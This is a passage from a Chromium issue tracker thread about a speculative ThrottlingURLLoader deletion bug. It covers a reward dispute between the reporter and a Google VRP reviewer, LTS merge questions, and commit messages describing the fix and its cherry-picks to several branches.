This however, would not result in a change of reward. Upon initial evaluation, it was noticed that there is a race condition here, but as race is not considerer a mitigation for issues in the renderer process, this we extended the full reward amount for potential memory corruption in the renderer. In the browser process, this is considered a mitigation. Additionally, the engineers have conveyed it does not seem possible this issue can happen in production without the patch. Since this also not demonstrated in your report, this is considered a speculative issue in terms of real-world exploitability in the browser.

### ha...@gmail.com (2024-07-25)

Thank you Amy for your answers. I think this should have a reward of ¥ 10,000 or more, but if you insist that so, I have no idea

### am...@chromium.org (2024-07-25)

No worries, always happy to provide answers. Apologies that it's not always immediately and if we don't agree on the answer.
To that end, I do want to convey that this worked out in your favor and we felt we were being quite fair with the original reward. To be very honest and quite candid, your report was well below what we consider baseline quality. We always err on the side of caution in handling issues presented as security bugs as potentially exploitable, but when it comes to VRP rewards and to be considered for the highest possible reward based on the class of vulnerability, impact, and potential for user harm, the onus is on the reporter to demonstrate those aspects and present the impact and security consequences in a clear and demonstrable way. This is even a part of our reward policies, "reports should not simply suggest a theoretical or potential vulnerability based solely on static code analysis." [1]

This bug is presented as purely theoretical and speculative, and requires a patch that does not converted into preconditions for real world exploitability. Given these matters and the constraints, it seems that $8,000 is very fair for report that presents static analysis and put a lot of onus on the engineering team to discern the issue at hand.

[1] <https://g.co/chrome/vrp#report-quality>

### ha...@gmail.com (2024-07-25)

Anyway, thank you for your detailed answer.:)

### pe...@google.com (2024-09-09)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### rz...@google.com (2024-09-10)

1. <https://crrev.com/c/5845051>
2. Low, no conflicts
3. 127
4. Yes

### ap...@google.com (2024-09-18)

Project: chromium/src
Branch: refs/branch-heads/6478

commit d68d9d65e0bfa24955247aa84699e7ee6b6b4815
Author: Hiroshige Hayashizaki <hiroshige@chromium.org>
Date:   Wed Sep 18 15:05:13 2024

    [M126-LTS] Handle ThrottlingURLLoader deletion during throttle calls
    
    Theoretically `ThrottlingURLLoader` can be deleted during
    throttle calls and some call sites have already protection
    for such cases. This CL adds the protection for more call sites.
    
    This CL also adds more unit tests for cancelling/deleting
    `ThrottlingURLLoader` during throttle calls.
    
    (cherry picked from commit c40f8866cfd6438725cc58e5db2d792e6d9f869b)
    
    Bug: 349342289
    Change-Id: I80d64be9ba1a3ac920315f5b4012b29c9737e414
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5665925
    Commit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1323986}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5845051
    Reviewed-by: Kouhei Ueno <kouhei@chromium.org>
    Reviewed-by: Giovanni Pezzino <giovax@google.com>
    Commit-Queue: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Cr-Commit-Position: refs/branch-heads/6478@{#1964}
    Cr-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313}

M       third_party/blink/common/loader/throttling_url_loader.cc
M       third_party/blink/common/loader/throttling_url_loader_unittest.cc

https://chromium-review.googlesource.com/5845051


### ap...@google.com (2024-09-18)

Project: chromium/src
Branch: refs/branch-heads/6099

commit e7ce1cdadde4ae4acbc4291a1e0a2970b8c8e540
Author: Hiroshige Hayashizaki <hiroshige@chromium.org>
Date:   Wed Sep 18 15:47:22 2024

    [M120-LTS] Handle ThrottlingURLLoader deletion during throttle calls
    
    M120 merge issues:
      OnReceiveResponse()/OnComplete():
        - conflicting arguments for RecordExecutionTimeHistogram() and
        HandleThrottleResult() calls before the added lines.
    
    Theoretically `ThrottlingURLLoader` can be deleted during
    throttle calls and some call sites have already protection
    for such cases. This CL adds the protection for more call sites.
    
    This CL also adds more unit tests for cancelling/deleting
    `ThrottlingURLLoader` during throttle calls.
    
    (cherry picked from commit c40f8866cfd6438725cc58e5db2d792e6d9f869b)
    
    Bug: 349342289
    Change-Id: I80d64be9ba1a3ac920315f5b4012b29c9737e414
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5665925
    Commit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1323986}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5744731
    Reviewed-by: Giovanni Pezzino <giovax@google.com>
    Commit-Queue: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Reviewed-by: Kouhei Ueno <kouhei@chromium.org>
    Cr-Commit-Position: refs/branch-heads/6099@{#2083}
    Cr-Branched-From: e6ee4500f7d6549a9ac1354f8d056da49ef406be-refs/heads/main@{#1217362}

M       third_party/blink/common/loader/throttling_url_loader.cc
M       third_party/blink/common/loader/throttling_url_loader_unittest.cc

https://chromium-review.googlesource.com/5744731


### ap...@google.com (2024-10-01)

Project: chromium/src  

Branch: refs/branch-heads/6478\_182  

Author: Hiroshige Hayashizaki <[hiroshige@chromium.org](mailto:hiroshige@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5899766>

[CfM-R126] Handle ThrottlingURLLoader deletion during throttle calls

---


Expand for full commit details
```
[CfM-R126] Handle ThrottlingURLLoader deletion during throttle calls

Theoretically `ThrottlingURLLoader` can be deleted during
throttle calls and some call sites have already protection
for such cases. This CL adds the protection for more call sites.

This CL also adds more unit tests for cancelling/deleting
`ThrottlingURLLoader` during throttle calls.

(cherry picked from commit c40f8866cfd6438725cc58e5db2d792e6d9f869b)

(cherry picked from commit d68d9d65e0bfa24955247aa84699e7ee6b6b4815)

Bug: 349342289
Change-Id: I80d64be9ba1a3ac920315f5b4012b29c9737e414
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5665925
Commit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/main@{#1323986}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5845051
Reviewed-by: Kouhei Ueno <kouhei@chromium.org>
Reviewed-by: Giovanni Pezzino <giovax@google.com>
Commit-Queue: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
Cr-Original-Commit-Position: refs/branch-heads/6478@{#1964}
Cr-Original-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5899766
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Owners-Override: Kyle Williams <kdgwill@chromium.org>
Auto-Submit: Kyle Williams <kdgwill@chromium.org>
Cr-Commit-Position: refs/branch-heads/6478_182@{#94}
Cr-Branched-From: 5b5d8292ddf182f8b2096fa665b473b6317906d5-refs/branch-heads/6478@{#1776}
Cr-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313}

```

---

Files:

- M `third_party/blink/common/loader/throttling_url_loader.cc`
- M `third_party/blink/common/loader/throttling_url_loader_unittest.cc`

---

Hash: d7894839f28337e7e830577697850b392c9ca35f  

Date:  Tue Oct 01 02:28:35 2024


---

### pe...@google.com (2024-10-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### dx...@google.com (2025-07-31)

Project: chromium/src  

Branch:  main  

Author:  Hiroshige Hayashizaki [hiroshige@chromium.org](mailto:hiroshige@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6803891>

Handle ThrottlingURLLoader deletion during WillStartRequest

---


Expand for full commit details
```
     
    1. This is a general safeguard, just like in 
    https://chromium-review.googlesource.com/c/chromium/src/+/5665925. 
     
    2. This is a fix for 
    https://chromium-review.googlesource.com/c/chromium/src/+/6774343. 
     
    Before the CL 6774343: the `std::unique_ptr<ThrottlingURLLoader>` is 
    held by a local variable in 
    `ThrottlingURLLoader::CreateLoaderAndStart()` and thus the 
    `ThrottlingURLLoader` in `NavigationURLLoaderImpl` cannot be deleted 
    during `WillStartRequest()`. 
     
    After the CL 6774343, it can be deleted through: 
    `WillStartRequest()` 
    -> calls `URLLoaderThrottle::Delegate::Cancel*()` 
    -> calls `NavigationURLLoaderImpl::OnComplete()` 
    -> `NavigationURLLoaderImpl::loader_holder_.url_loader_` is destroyed 
       possibly in `MaybeCreateLoaderForResponse()` for HTTPS autoupgrade 
       etc. (and will be always destroyed after after CL 6795327 below), 
    and this can possibly cause new crashes. 
     
    3. This is preparation for 
    https://chromium-review.googlesource.com/c/chromium/src/+/6795327: 
    The added code there actually deletes `ThrottlingURLLoader` during 
    `WillStartRequest()` in scenarios covered by tests. 
     
    Bug: 349342289, 434182226, 433324863 
    Change-Id: Ie2b997bc4c8f18ce82890edc41f531a8b22c78a1 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6803891 
    Reviewed-by: Kouhei Ueno <kouhei@chromium.org> 
    Commit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1494604}

```

---

Files:

- M `third_party/blink/common/loader/throttling_url_loader.cc`

---

Hash: [787f41be3b0c86598c27fd50517294c748435964](http://crrev.com/787f41be3b0c86598c27fd50517294c748435964)  

Date: Thu Jul 31 04:51:12 2025


---

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/349342289)*
